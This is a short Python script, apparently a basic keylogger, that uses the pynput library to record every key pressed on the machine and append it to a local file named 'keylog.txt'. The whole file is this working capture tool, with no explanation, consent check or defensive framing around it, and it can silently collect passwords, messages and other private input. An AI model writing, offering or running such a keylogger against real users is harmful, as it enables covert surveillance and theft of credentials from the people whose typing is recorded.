from pynput import keyboard
from datetime import datetime
import os
import time

output_file = 'keylog.txt'

def on_press(key):
    try:
        with open(output_file, 'a') as f:
            f.write(key.char)
    except AttributeError:
        with open(output_file, 'a') as f:
            f.write(f'[{str(key)}]')
    
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()